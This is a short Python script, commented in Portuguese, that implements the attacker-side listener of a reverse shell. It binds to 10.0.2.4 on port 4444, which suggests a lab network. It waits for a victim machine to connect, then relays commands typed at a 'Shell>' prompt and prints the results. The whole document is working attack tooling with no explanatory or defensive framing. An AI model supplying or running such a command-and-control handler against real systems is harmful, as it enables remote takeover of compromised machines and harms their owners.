import socket

# Configuração do server, IP/PORTA do host server
IP_SERVIDOR = '10.0.2.4'
PORTA = 4444

def servidor_reverse_shell():
    servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    servidor.bind((IP_SERVIDOR, PORTA))
    servidor.listen(1)

    print(f'[+] Aguardando conexao na porta {PORTA}...')

    cliente, endereco = servidor.accept()
    print(f'[+] Conexao recebida de {endereco[0]}:{endereco[1]}')

    while True:
        comando = input('Shell> ')

        if comando.lower() == 'exit':
            cliente.send(comando.encode())
            break

        cliente.send(comando.encode())

        resposta = cliente.recv(4096).decode('utf-8')
        print(resposta)

    cliente.close()
    servidor.close()

if __name__ == "__main__":
    servidor_reverse_shell()